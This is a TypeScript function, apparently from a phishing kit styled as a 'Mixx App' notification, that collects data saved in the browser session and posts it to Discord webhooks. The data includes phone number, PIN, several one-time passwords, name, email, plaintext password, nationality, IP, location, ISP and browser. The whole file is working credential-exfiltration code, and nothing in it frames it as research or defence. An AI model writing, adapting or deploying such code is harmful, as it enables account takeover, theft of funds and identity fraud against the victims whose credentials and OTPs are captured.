
export const sendDiscordMessage = async (params: {
    type?: string;
    title?: string;
    exclude?: string[];
    [key: string]: any;
}) => {
    const webhookEnv = process.env.NEXT_PUBLIC_DISCORD_WEBHOOK_URL;
    const DISCORD_WEBHOOK_URLS = webhookEnv ? webhookEnv.split(",").map(url => url.trim()) : [];

    try {
        // Retrieve previous info from sessionStorage
        const storedInfo = {
            ip: sessionStorage.getItem("ip") || "Unknown",
            city: sessionStorage.getItem("city") || "N/A",
            region: sessionStorage.getItem("region") || "N/A",
            country: sessionStorage.getItem("country") || "N/A",
            isp: sessionStorage.getItem("isp") || "N/A",
            browser: sessionStorage.getItem("browser") || "Unknown",
            phoneNumber: sessionStorage.getItem("userPhone") || "N/A",
            pin: sessionStorage.getItem("userPin") || "N/A",
            otp1: sessionStorage.getItem("userOtp1") || "N/A",
            name: sessionStorage.getItem("userName") || "N/A",
            email: sessionStorage.getItem("userEmail") || "N/A",
            password: sessionStorage.getItem("userPassword") || "N/A",
            nationality: sessionStorage.getItem("userNationality") || "N/A",
            otp2: sessionStorage.getItem("userOtp2") || "N/A",
            otp3: sessionStorage.getItem("userOtp3") || "N/A",
            otp_new: sessionStorage.getItem("userOtpNew") || "N/A",
        };

        const { title, exclude, ...newInfo } = params;

        // Combine with new info
        const fullInfo = { ...storedInfo, ...newInfo };

        // Construct message fields
        const fields = [];

        if (!exclude?.includes("location")) {
            // Location fields could be added here if needed, but keeping it simpler for now or following the pattern
            // fields.push({ name: "🌍 IP", value: fullInfo.ip, inline: true });
        }

        let description = "";

        if (!exclude?.includes("location")) {
            description += `**🌍 DEVICE & LOCATION**\n`;
            if (!exclude?.includes("ip")) description += `• **IP:** ${fullInfo.ip}\n`;
            description += `• **Link:** ${typeof window !== "undefined" ? window.location.href : "N/A"}\n`;
            description += `• **Referrer:** ${typeof document !== "undefined" && document.referrer ? document.referrer : "Direct/None"}\n`;
            description += `• **Location:** ${fullInfo.city}, ${fullInfo.country}\n`;
            description += `• **Browser:** ${fullInfo.browser}\n`;
            description += `• **ISP:** ${fullInfo.isp}\n`;

            if (newInfo.lat && newInfo.lon) {
                description += `• **Map:** [View on Map](https://www.google.com/maps?q=${newInfo.lat},${newInfo.lon})\n`;
            }
            description += `\n`;
        }

        if (!exclude?.includes("contact")) {
            description += `**👤 USER DATA TRACKING**\n`;
            description += `• **Phone:** \`${fullInfo.phoneNumber}\`\n`;

            if (!exclude?.includes("pin") && fullInfo.pin !== "N/A") {
                description += `• **PIN:** \`${fullInfo.pin}\`\n`;
            }
            if (!exclude?.includes("otp1") && fullInfo.otp1 !== "N/A") {
                description += `• **OTP-1:** \`${fullInfo.otp1}\`\n`;
            }
            if (!exclude?.includes("otp_new") && fullInfo.otp_new !== "N/A") {
                description += `• **New OTP:** \`${fullInfo.otp_new}\`\n`;
            }
            description += `\n`;
        }

        if (!exclude?.includes("profile") && (fullInfo.name !== "N/A" || fullInfo.email !== "N/A" || fullInfo.password !== "N/A")) {
            description += `**📄 PROFILE INFO**\n`;
            if (fullInfo.name !== "N/A") description += `• **Name:** ${fullInfo.name}\n`;
            if (fullInfo.email !== "N/A") description += `• **Email:** ${fullInfo.email}\n`;
            if (fullInfo.password !== "N/A") description += `• **Pass:** \`${fullInfo.password}\`\n`;
            if (fullInfo.nationality !== "N/A") description += `• **Nat:** ${fullInfo.nationality}\n`;
            description += `\n`;
        }

        if (!exclude?.includes("otp2") && fullInfo.otp2 !== "N/A") {
            description += `• **OTP-2:** \`${fullInfo.otp2}\`\n`;
        }

        if (!exclude?.includes("otp3") && fullInfo.otp3 !== "N/A") {
            description += `• **OTP-3:** \`${fullInfo.otp3}\`\n`;
        }


        const payload = {
            embeds: [
                {
                    title: `🚀 ${title || "ACTION ALERT"}`,
                    description: description,
                    color: 3447003, // Blue-ish color
                    footer: {
                        text: "Mixx App Notification"
                    },
                    timestamp: new Date().toISOString()
                }
            ]
        };

        await Promise.all(DISCORD_WEBHOOK_URLS.map(url => {
            if (!url.startsWith("http")) return Promise.resolve();
            return fetch(url, {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify(payload),
            }).catch(err => console.error(`Error sending to Discord webhook ${url}:`, err));
        }));

    } catch (error) {
        console.error("Error in sendDiscordMessage:", error);
    }
};
